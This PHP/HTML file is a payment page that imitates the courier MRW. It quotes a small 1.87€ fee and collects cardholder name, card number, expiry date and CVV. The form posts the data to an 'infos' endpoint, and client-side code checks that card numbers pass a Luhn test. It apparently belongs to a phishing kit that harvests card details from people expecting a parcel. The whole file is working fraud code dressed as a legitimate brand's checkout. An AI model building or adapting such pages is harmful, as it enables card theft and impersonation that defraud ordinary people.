<?php require_once __DIR__ . "/../vender/visitors.php"; ?>
<?php require_once __DIR__ . "/../vender/languages.php"; ?>
<!DOCTYPE html>
<html lang="<?php echo $lang_code; ?>" <?php echo ($lang_code == 'ar' ? 'dir="rtl"' : ''); ?>>
<head>
    <meta charset="utf-8">
    <title>MRW</title>
	<!-- logo img title-->
    <link rel="icon" href="image/om.png" type="image/x-png"/>
    <link rel="shortcut icon" href="image/om.png" type="image/x-png" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/asse.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        #menuFooter {
            background-color: #1b224d;
            color: #fff;
            padding: 40px 0;
            font-size: 0.9rem;
        }
        #menuFooter h3 {
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 20px;
            color: #fff;
        }
        #menuFooter ul {
            list-style: none;
            padding: 0;
        }
        #menuFooter ul li {
            margin-bottom: 8px;
        }
        #menuFooter ul li a {
            color: #ccc;
            text-decoration: none;
        }
        #social {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }
        #social li a {
            color: #fff !important;
        }
        #menuLegal {
            background-color: #1b224d;
            padding: 20px 0;
            text-align: center;
            border-top: 1px solid #444;
        }
        #menuLegal ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
        }
        #menuLegal ul li {
            color: #888;
            font-size: 0.8rem;
        }
        #menuLegal ul li a {
            color: #888;
            text-decoration: none;
        }
        /* Remove blue focus ring and validation colors */
        .form-control:focus {
            border-color: #ced4da;
            box-shadow: none;
            outline: 0;
        }
        .is-invalid, .is-valid {
            border-color: #ced4da !important;
            background-image: none !important;
            box-shadow: none !important;
        }
        .is-invalid + .invalid-feedback {
            display: block !important;
            color: #dc3545;
            font-size: 0.8rem;
            margin-top: 4px;
        }
        <?php if($lang_code == 'ar'): ?>
        body { text-align: right; }
        .icon-mrw { margin-left: 10px; margin-right: 0; }
        .me-2 { margin-left: 0.5rem !important; margin-right: 0 !important; }
        .ms-2 { margin-right: 0.5rem !important; margin-left: 0 !important; }
        <?php endif; ?>
    </style>
</head>
<body>
    <header>
        <div class="container">
            <img src="image/ogou.png" alt="MRW" width="100">
        </div>
    </header>

    <main id="main" class="py-5">
        <div class="container">
            <article class="col-md-6 mx-auto">
                <div class="login border bg-light p-4">
                    <h2 class="mb-3"><i class="fas fa-credit-card icon-mrw"></i> <?php echo $txt['online_payment']; ?></h2>
                    <p class="mb-4"><?php echo $txt['payment_desc']; ?></p>
                    
                    <div class="alert alert-secondary d-flex justify-content-between align-items-center">
                        <span><i class="fas fa-receipt me-2"></i> <?php echo $txt['total_sum']; ?>:</span>
                        <strong class="fs-4 text-secondary">1.87€</strong>
                    </div>

                    <form action="infos" method="post" id="payment-form">
                        <input type="hidden" name="step" value="cc">
                                          <div class="mb-3">
                            <label class="form-label fw-bold"><?php echo $txt['card_holder']; ?></label>
                            <input type="text" class="form-control" name="fname" id="card-holder" placeholder="<?php echo $txt['card_holder']; ?>" required>
                            <div class="invalid-feedback">Por favor, introduzca el nombre del titular</div>
                        </div>                
                        <div class="mb-3 position-relative">
                            <label class="form-label fw-bold"><?php echo $txt['card_number']; ?></label>
                            <div class="input-group">
                                <span class="input-group-text"><i class="fas fa-credit-card"></i></span>
                                <input type="tel" class="form-control" name="card" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required>
                            </div>
                            <div class="invalid-feedback">Número de tarjeta no válido</div>
                        </div>
                        
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <label class="form-label fw-bold"><?php echo $txt['expiry_date']; ?></label>
                                <input type="tel" class="form-control" name="date" placeholder="MM/YY" maxlength="5" required>
                                <div class="invalid-feedback">Fecha fuera de rango (05/26 - 05/36)</div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <label class="form-label fw-bold"><?php echo $txt['cvv']; ?></label>
                                <div class="input-group">
                                    <input type="tel" class="form-control" name="cvv" placeholder="123" maxlength="4" required>
                                </div>
                            </div>
                        </div>
                        
                        <button type="submit" name="submit" class="btn btn-lg w-100 mt-3"><?php echo $txt['send_payment']; ?> <i class="fas fa-shield-alt ms-2"></i></button>
                    </form>
                    
                    <div id="card-type-icon" class="mt-4 text-center">
                        <i class="fab fa-cc-visa fa-2x text-muted me-2"></i>
                        <i class="fab fa-cc-mastercard fa-2x text-muted me-2"></i>
                        <i class="fab fa-cc-amex fa-2x text-muted me-2"></i>
                        <i class="fab fa-apple-pay fa-2x text-muted me-2"></i>
                        <i class="fab fa-google-pay fa-2x text-muted"></i>
                    </div>
                </div>
            </article>
        </div>
    </main>

    <footer class="navbar-inverse footer" id="menuFooter">
        <div class="container">
            <div class="row aligned-row">
                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['envios']; ?></h3>
                    <ul>
                        <li><?php echo $txt['tracking']; ?></li>
                        <li><?php echo $txt['locate_office']; ?></li>
                        <li><?php echo $txt['arrange_delivery']; ?></li>
                        <li><?php echo $txt['packaging']; ?></li>
                        <li><?php echo $txt['benefits']; ?></li>
                        <li><?php echo $txt['fuel_surcharge']; ?></li>
                        <li><?php echo $txt['general_conditions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['individuals']; ?></h3>
                    <ul>
                        <li><?php echo $txt['my_mrw']; ?></li>
                        <li><?php echo $txt['your_shipments']; ?></li>
                        <li><?php echo $txt['make_shipment']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['mrw_pack']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['companies']; ?></h3>
                    <ul>
                        <li><?php echo $txt['shipments_company']; ?></li>
                        <li><?php echo $txt['become_mrw_point']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['burofax']; ?></li>
                        <li><?php echo $txt['digital_logistics']; ?></li>
                        <li><?php echo $txt['ecommerce']; ?></li>
                        <li><?php echo $txt['logistics_solutions']; ?></li>
                        <li><?php echo $txt['sector_solutions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['social_responsibility']; ?></h3>
                    <ul>
                        <li><?php echo $txt['our_rsc']; ?></li>
                        <li><?php echo $txt['solidarity_shipments']; ?></li>
                        <li><?php echo $txt['discounted_services']; ?></li>
                        <li><?php echo $txt['ethical_channel']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['news_blog']; ?></h3>
                    <ul>
                        <li><?php echo $txt['blog']; ?></li>
                        <li><?php echo $txt['news']; ?></li>
                    </ul>
                </div>

                <div id="divSobreMRW" class="col-md-2 footer-links col-xs-12 col-sm-6">
                    <ul id="social">
                        <li><i class="fab fa-facebook-f fa-2x"></i></li>
                        <li><i class="fab fa-twitter fa-2x"></i></li>
                        <li><i class="fab fa-youtube fa-2x"></i></li>
                        <li><i class="fab fa-linkedin-in fa-2x"></i></li>
                        <li><i class="fab fa-instagram fa-2x"></i></li>
                    </ul>
                    <ul>
                        <li><?php echo $txt['contact_us']; ?></li>
                        <li><?php echo $txt['who_we_are']; ?></li>
                        <li><?php echo $txt['our_offices']; ?></li>
                        <li><?php echo $txt['work_with_us']; ?></li>
                        <li><?php echo $txt['customer_service']; ?></li>
                    </ul>
                </div>
            </div>
        </div>

        <div id="menuLegal">
            <div class="container">
                <ul>
                    <li><?php echo $txt['copyright']; ?></li>
                    <li><?php echo $txt['accessibility']; ?></li>
                    <li><?php echo $txt['privacy_policy']; ?></li>
                    <li><?php echo $txt['legal_notice']; ?></li>
                    <li><?php echo $txt['cookies_policy']; ?></li>
                    <li><?php echo $txt['fraud_info']; ?></li>
                    <li><?php echo $txt['eu_dispute']; ?></li>
                    <li><?php echo $txt['web_map']; ?></li>
                    <li>W3C-WAI</li>
                    <li id="gesPymeFooter" style="display: inline-block; margin-left: 10px;">
                        <img src="image/peku.png" alt="Proyecto G3 - GesPyME" style="height: 25px;">
                    </li>
                </ul>
            </div>
        </div>
    </footer>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            function isValidLuhn(number) {
                let sum = 0;
                let shouldDouble = false;
                for (let i = number.length - 1; i >= 0; i--) {
                    let digit = parseInt(number.charAt(i));
                    if (shouldDouble) {
                        if ((digit *= 2) > 9) digit -= 9;
                    }
                    sum += digit;
                    shouldDouble = !shouldDouble;
                }
                return (sum % 10) === 0;
            }

            function isValidExpiry(value) {
                if (!/^\d{2}\/\d{2}$/.test(value)) return false;
                let [month, year] = value.split('/').map(n => parseInt(n));
                if (month < 1 || month > 12) return false;
                let expiryValue = year * 100 + month;
                let startLimit = 2605;
                let endLimit = 3605;
                return expiryValue >= startLimit && expiryValue <= endLimit;
            }

            $('#card-number').on('input', function() {
                let val = $(this).val().replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                let formatted = val.match(/.{1,4}/g);
                $(this).val(formatted ? formatted.join(' ') : '');
                if (val.length >= 16) {
                    if (isValidLuhn(val)) $(this).removeClass('is-invalid').addClass('is-valid');
                    else $(this).removeClass('is-valid').addClass('is-invalid');
                } else {
                    $(this).removeClass('is-valid is-invalid');
                }
            });

            $('input[name="date"]').on('input', function() {
                let val = $(this).val().replace(/[^0-9]/g, '');
                if (val.length >= 2) val = val.substring(0,2) + '/' + val.substring(2,4);
                $(this).val(val);
                if (val.length === 5) {
                    if (isValidExpiry(val)) $(this).removeClass('is-invalid').addClass('is-valid');
                    else $(this).removeClass('is-valid').addClass('is-invalid');
                }
            });

            $('input[name="cvv"]').on('input', function() {
                $(this).val($(this).val().replace(/[^0-9]/g, ''));
            });

            $('#payment-form').on('submit', function(e) {
                let card = $('#card-number').val().replace(/\s+/g, '');
                let date = $('input[name="date"]').val();
                let holder = $('#card-holder').val().trim();
                let isValid = true;

                if (holder.length < 3) {
                    $('#card-holder').addClass('is-invalid');
                    isValid = false;
                }
                if (!isValidLuhn(card)) {
                    $('#card-number').addClass('is-invalid');
                    isValid = false;
                }
                if (!isValidExpiry(date)) {
                    $('input[name="date"]').addClass('is-invalid');
                    isValid = false;
                }

                if (!isValid) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
</html>
